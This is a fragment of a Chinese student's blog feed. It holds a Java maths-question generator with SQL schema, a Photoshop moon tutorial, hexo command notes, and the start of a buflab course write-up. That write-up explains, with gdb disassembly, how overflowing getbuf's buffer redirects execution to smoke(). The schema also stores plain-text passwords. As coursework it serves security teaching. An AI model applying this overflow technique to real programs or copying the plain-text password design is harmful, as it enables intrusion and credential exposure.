class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String[] getQuestionsArray(<span class="type">int</span> number) &#123;</span><br><span class="line">    String[] questions = <span class="keyword">new</span> <span class="title class_">String</span>[number];</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">question</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; number; index++) &#123;</span><br><span class="line">        <span class="comment">//操作数数量，1到5个</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">operandsNumber</span> <span class="operator">=</span> random.nextInt(<span class="number">5</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//括号起始点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bracketStart</span> <span class="operator">=</span> random.nextInt(operandsNumber);</span><br><span class="line">        <span class="comment">//括号终止点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bracketEnd</span> <span class="operator">=</span> random.nextInt(operandsNumber);</span><br><span class="line">        <span class="comment">//初中符号个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">juniorSymbolNum</span> <span class="operator">=</span> random.nextInt(operandsNumber) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//根号个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">RadicalNum</span> <span class="operator">=</span> random.nextInt(juniorSymbolNum + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//平方个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">squareNum</span> <span class="operator">=</span> juniorSymbolNum - RadicalNum;</span><br><span class="line">        <span class="comment">//高中符号个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">highSymbolNum</span> <span class="operator">=</span> operandsNumber == <span class="number">1</span> ? <span class="number">1</span> : random.nextInt(operandsNumber) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//是否有括号</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isBracketIllegal</span> <span class="operator">=</span> bracketStart &lt; bracketEnd;</span><br><span class="line">        <span class="type">int</span>[] operands = <span class="keyword">new</span> <span class="title class_">int</span>[operandsNumber];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; operandsNumber; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//是否加高中符号</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">addHighSymbol</span> <span class="operator">=</span> operandsNumber == <span class="number">1</span> || random.nextBoolean();</span><br><span class="line">            <span class="comment">//是否加根号</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">addRadical</span> <span class="operator">=</span> !addHighSymbol &amp;&amp; random.nextBoolean();</span><br><span class="line">            <span class="comment">//是否加平方</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">addSquare</span> <span class="operator">=</span> !addRadical &amp;&amp; random.nextBoolean();</span><br><span class="line">            operands[i] = random.nextInt(<span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (isBracketIllegal &amp;&amp; i == bracketStart) &#123;</span><br><span class="line">                <span class="comment">//在括号外加根号</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">outsideRadical</span> <span class="operator">=</span> random.nextBoolean();</span><br><span class="line">                <span class="comment">//在括号外加高中符号</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">outsideHighSymbol</span> <span class="operator">=</span> !outsideRadical &amp;&amp; random.nextBoolean();</span><br><span class="line">                <span class="keyword">if</span> (outsideRadical &amp;&amp; RadicalNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    question.append(<span class="string">&quot;√&quot;</span>);</span><br><span class="line">                    RadicalNum--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (outsideHighSymbol &amp;&amp; highSymbolNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    question.append(highSymbols[random.nextInt(highSymbols.length)]);</span><br><span class="line">                    highSymbolNum--;</span><br><span class="line">                &#125;</span><br><span class="line">                question.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//普通根号</span></span><br><span class="line">            <span class="keyword">if</span> (addRadical &amp;&amp; RadicalNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                question.append(<span class="string">&quot;√&quot;</span>);</span><br><span class="line">                RadicalNum--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (addHighSymbol &amp;&amp; highSymbolNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                question.append(highSymbols[random.nextInt(highSymbols.length)]);</span><br><span class="line">                highSymbolNum--;</span><br><span class="line">            &#125;</span><br><span class="line">            question.append(operands[i]);</span><br><span class="line">            <span class="comment">//普通平方</span></span><br><span class="line">            <span class="keyword">if</span> (addSquare &amp;&amp; squareNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                question.append(<span class="string">&quot;²&quot;</span>);</span><br><span class="line">                squareNum--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (isBracketIllegal &amp;&amp; i == bracketEnd) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">outsideSquare</span> <span class="operator">=</span> random.nextBoolean();</span><br><span class="line"></span><br><span class="line">                question.append(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">                <span class="comment">//括号外平方</span></span><br><span class="line">                <span class="keyword">if</span> (outsideSquare &amp;&amp; squareNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    question.append(<span class="string">&quot;²&quot;</span>);</span><br><span class="line">                    squareNum--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; operandsNumber - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">symbolIndex</span> <span class="operator">=</span> random.nextInt(symbols.length);</span><br><span class="line">                question.append(symbols[symbolIndex]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//最后一个操作数后面为=号</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                question.append(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        questions[index] = question.toString();</span><br><span class="line">        System.out.println(question);</span><br><span class="line">        question.delete(<span class="number">0</span>, question.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> questions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="user用户信息"><a href="#user用户信息" class="headerlink" title="user用户信息"></a>user用户信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span></span><br><span class="line">(</span><br><span class="line">    account  <span class="type">varchar</span>(<span class="number">12</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">        <span class="keyword">primary</span> key,</span><br><span class="line">    password <span class="type">varchar</span>(<span class="number">15</span>) <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">identity</span> <span class="type">varchar</span>(<span class="number">5</span>)  <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="questions题目信息"><a href="#questions题目信息" class="headerlink" title="questions题目信息"></a>questions题目信息</h3><p>将question和account设置为键，使添加时，同一个用户不能重发添加一个题，实现题目查重</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> questions</span><br><span class="line">(</span><br><span class="line">    q_id         <span class="type">int</span> auto_increment</span><br><span class="line">        <span class="keyword">primary</span> key,</span><br><span class="line">    question     <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">null</span>,</span><br><span class="line">    account      <span class="type">varchar</span>(<span class="number">8</span>)  <span class="keyword">null</span>,</span><br><span class="line">    created_time <span class="type">timestamp</span>   <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">constraint</span> questions_pk</span><br><span class="line">        <span class="keyword">unique</span> (question, account),</span><br><span class="line">    <span class="keyword">constraint</span> questions_fk</span><br><span class="line">        <span class="keyword">foreign</span> key (account) <span class="keyword">references</span> <span class="keyword">user</span> (account)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><hr><h1 id="完整程序代码"><a href="#完整程序代码" class="headerlink" title="完整程序代码"></a>完整程序代码</h1><div class="note simple"><p>项目完整文件已经上传到<a href="https://github.com/KallenBlue/TestGeneration">github</a>，仅供参考</p></div>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;note simple&quot;&gt;&lt;p&gt;本来是不打算写这个课程作业的博客的，但是后续结队编程又需要和队友相互交流代码，而我当时写代码的时候也没有过多的注释，为了能够让我的结队队友“、、”能够更轻松的(至少不会想捶我)完成课程任务，我还是准备写篇博客简单介绍一下课程</summary>
      
    
    
    
    <category term="课程作业" scheme="https://kallenblue.github.io/categories/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="Java" scheme="https://kallenblue.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>中秋节在女友手上p了一个超级漂亮的月亮</title>
    <link href="https://kallenblue.github.io/2022/09/11/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/%E4%B8%AD%E7%A7%8B%E8%8A%82%E5%9C%A8%E5%A5%B3%E5%8F%8B%E6%89%8B%E4%B8%8Ap%E4%BA%86%E4%B8%80%E4%B8%AA%E8%B6%85%E7%BA%A7%E6%BC%82%E4%BA%AE%E7%9A%84%E6%9C%88%E4%BA%AE/"/>
    <id>https://kallenblue.github.io/2022/09/11/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/%E4%B8%AD%E7%A7%8B%E8%8A%82%E5%9C%A8%E5%A5%B3%E5%8F%8B%E6%89%8B%E4%B8%8Ap%E4%BA%86%E4%B8%80%E4%B8%AA%E8%B6%85%E7%BA%A7%E6%BC%82%E4%BA%AE%E7%9A%84%E6%9C%88%E4%BA%AE/</id>
    <published>2022-09-10T19:16:38.000Z</published>
    <updated>2022-09-13T01:58:51.917Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/429abb27-348d-4c29-b8b2-15bb68f6614b.png" alt="效果图"><br><strong>效果图</strong></p><hr><p>需要提前准备的:<br>Photoshop，一张女友的照片，一张背景为纯色的月亮图(或者月亮与周围环境比较分明的图片)</p><hr><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/7ab53ef1-f9d9-49a4-9bce-3bb31492f320.png" alt="效果图"><br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/d236ff73-1c79-451f-a62f-6b38873e7e6b.jpg" alt="效果图"><br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/6e0c1d12-0412-4ca5-bbe3-ce5b5c05fdac.jpg" alt="效果图"></p><h2 id="1-抠图"><a href="#1-抠图" class="headerlink" title="1.抠图"></a>1.抠图</h2><p>任何抠图的操作都可以用，我这里选择用套索，怎么方便怎么来<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/9376c9ab-c887-485a-a1de-608532c17f5d.png"><br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/2c52b36b-c211-4899-a6f5-d9bd7102649b.png"></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/91edc2a2-44f5-4014-8a90-92448a4b4d14.png"></p><p>选好之后，ctrl+shift+i反选，然后ctrl+shift+j分离图层</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/b2d13d30-da54-4640-832f-8354b6de8cdd.png"><br>成功获取到一个月亮！</p><h2 id="2-调整图片位置"><a href="#2-调整图片位置" class="headerlink" title="2.调整图片位置"></a>2.调整图片位置</h2><p>将女朋友的照片拖进来<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/88b77f21-6040-4638-b7fb-5756af6b6ccd.png"><br>选中月亮图层，ctrl+T调整月亮的大小和位置<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/1678c70c-bd21-4a2a-a1a4-e59ba4b70e41.png"></p><h2 id="3-让月亮融入环境"><a href="#3-让月亮融入环境" class="headerlink" title="3.让月亮融入环境"></a>3.让月亮融入环境</h2><p>现在的月亮有很明显的贴入感<br>首先将其颜色修改得和背景贴切一点<br>图像——调整——匹配颜色…<br>手动调节，使其融入环境，我这里是调亮了一些<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/7fab23d9-fd3a-4085-8457-749afd5295ef.png"><br>还可以通过<strong>图像——调整——色阶</strong>或<strong>图像——调整——曲线</strong><br>调整亮度<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/0502538a-1502-49af-b886-a1fd12c07844.png"></p><p>接下来是调整边框，可以看到边框有明显的一层描边，我们需要让其边框和背景相融<br>先将图片放大，然后选择<strong>编辑——描边</strong></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/f4725622-d5ef-4c40-a8a9-97ce34b2cecc.png"></p><p>注意，取色要取周围最近的环境的颜色，确认之后看效果，可以根据自己的图片情况进行调整<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/18248447-5d71-48ce-a316-aae3ecd21384.png"></p><p>最后，将图片导出就OK了<br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/956a2a3e-bac6-4697-b31e-4223d3a50154.png"></p><p>怎么样，是不是很简单，大家也赶紧来试一试吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/429abb27-348d-4c29-b8b2-15bb68f6614b.png&quot; alt=&quot;效果</summary>
      
    
    
    
    <category term="生活小技巧" scheme="https://kallenblue.github.io/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
    
    <category term="ps" scheme="https://kallenblue.github.io/tags/ps/"/>
    
  </entry>
  
  <entry>
    <title>简要记录一下hexo处理博客的操作</title>
    <link href="https://kallenblue.github.io/2022/09/08/%E5%A4%87%E5%BF%98/%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bhexo%E5%A4%84%E7%90%86%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>https://kallenblue.github.io/2022/09/08/%E5%A4%87%E5%BF%98/%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bhexo%E5%A4%84%E7%90%86%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2022-09-08T15:31:35.000Z</published>
    <updated>2022-09-13T01:56:42.252Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此篇文章主要是写给自己看，很久没用更新博客了，今天突然想起完善自己的博客，但是遗忘了很多操作，之前也没有记录，所以花了很多时间，不想再重复跳坑了，以后也会尽量记录这些操作性很低但是却又不得不做的事。</p></blockquote><h2 id="1-指令"><a href="#1-指令" class="headerlink" title="1.指令"></a>1.指令</h2><p>主要使用四种:new,generate,deploy,clean</p><p><strong>new</strong></p><blockquote><p>hexo new [layout] &lt;title&gt;</p></blockquote><p>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><blockquote><p>hexo new “post title with whitespace”</p></blockquote><p><strong>generate</strong></p><blockquote><p>hexo generate</p></blockquote><p>生成静态文件，主要用来生成新添加的图片，在上传文件之前要先执行这个命令</p><p>该命令可以简写为</p><blockquote><p>hexo g</p></blockquote><p><strong>deploy</strong></p><blockquote><p>hexo deploy</p></blockquote><p>部署网站。<br>| 参数  | 描述 |<br>| :–: | :–: |<br>| -g, –generate |  部署之前预先生成静态文件 | </p><p>该命令可以简写为：</p><blockquote><p>hexo d</p></blockquote><p><strong>clean</strong></p><blockquote><p>hexo clean</p></blockquote><p>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p><h2 id="2-关于新增图片"><a href="#2-关于新增图片" class="headerlink" title="2.关于新增图片"></a>2.关于新增图片</h2><blockquote><p><strong>/public/image来自于/source/image</strong></p></blockquote><blockquote><p><strong>/public/img来自于/themes/butterfly/source/img</strong>(我用的是butterfly主题)</p></blockquote><p>所以要将需要使用的图片放到后一个文件夹里面，还有就是图片名的第一个字符不要是”.”,我加了个”.”好像是会添加失败，也可能是我之前的迷糊操作，whatever，反正最好不加</p><hr><p>22-09-09<br>今天给典典看我的博客，发现手机上加载图片特别慢，他问我为什么不直接使用链接，因为图片都是从github上获取的，确实会比较慢，今天回来试了一下，确实可以，效果还不错，所以记录一下</p><h3 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h3><p>之前刚搭建博客的时候就比较粗糙，后续会完善，继续记录一下搭建过程</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此篇文章主要是写给自己看，很久没用更新博客了，今天突然想起完善自己的博客，但是遗忘了很多操作，之前也没有记录，所以花了很多时间，不想再重复跳坑了，以后也会尽量记录这些操作性很低但是却又不得不做的事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id</summary>
      
    
    
    
    <category term="备忘" scheme="https://kallenblue.github.io/categories/%E5%A4%87%E5%BF%98/"/>
    
    
    <category term="随笔" scheme="https://kallenblue.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>buflab-计算机系统实验</title>
    <link href="https://kallenblue.github.io/2022/09/08/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/buflab-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/"/>
    <id>https://kallenblue.github.io/2022/09/08/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/buflab-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/</id>
    <published>2022-09-08T15:12:26.000Z</published>
    <updated>2022-09-13T01:58:36.036Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-查看cookie"><a href="#0-查看cookie" class="headerlink" title="0. 查看cookie"></a><strong>0. 查看cookie</strong></h1> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./makecookie 202026010521</span><br><span class="line">0x685c1d96</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="1-Level0-Candle-10-pts"><a href="#1-Level0-Candle-10-pts" class="headerlink" title="1.Level0: Candle (10 pts)"></a><strong>1.Level0: Candle (10 pts)</strong></h1><p>Your task is to get BUFBOMB to execute the code forsmoke when getbuf executes its return statement,rather than returning to test.Note that your exploit string may also corrupt parts of the stack notdirectlyrelated to this stage, but this will not cause a problem, since smokecauses the program to exit directly.</p><p>题意解析：这里就是要让test运行完后，不直接返回退出。而是跳到smoke函数处，继续运行，而当smoke运行完毕后，才退出。</p><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possiblecorruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corruption stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has beencorrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Smoke源码：</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">smoke</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Smoke!: You calledsmoke()&quot;</span>);</span><br><span class="line">    validate(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><img src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p><p>Gets()函数用来获取数据到缓冲区，而Gets()函数不会对输入的数据进行边界检查。所以当我们的输入超过了缓冲区的大小（这里是32）时，超过缓冲区的数据就会覆盖内存中用作其它用途的数据，从而改变程序的行为。</p><p>要运行smoke()函数，只需要将buf区的内容冲到返回地址即可，这样原本应该返回到test()函数的地址被修改为了smoke()函数的地址</p><p>查看getbuf()汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现buf缓冲区大小为0x28，加上ebp所指空间，则到达返回地址空间，故答案中的前44个字节可以任意填写（由于Gets是通过换行符\n（ASCII值0x0a）界定输入终止的，所以前44字节只要不是0a就可以），最后四个字节填写smoke()函数的地址</p><p>查看smoke()函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble smoke </span><br><span class="line">Dump of assembler code for function smoke:</span><br><span class="line">   0x08048e0a &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048e0b &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048e0d &lt;+3&gt;:sub    $0x18,%esp</span><br><span class="line">   0x08048e10 &lt;+6&gt;:movl   $0x804a2fe,0x4(%esp)</span><br><span class="line">   0x08048e18 &lt;+14&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048e1f &lt;+21&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048e24 &lt;+26&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048e2b &lt;+33&gt;:call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048e30 &lt;+38&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048e37 &lt;+45&gt;:call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>地址为0x08048e0a,可以看到地址中有0a，查阅资料可知0a对应的ASCII码为换行符，写入会出错。可以看到smoke()最后有调用一个exit()函数，即直接退出程序，不再返回到原函数，所以smoke()函数的第一条汇编码可以忽略(此汇编码表示存储test()函数栈底esp的地址)，所以我们选择0x08048e0b</p><h5 id="答案及结果"><a href="#答案及结果" class="headerlink" title="答案及结果"></a>答案及结果</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 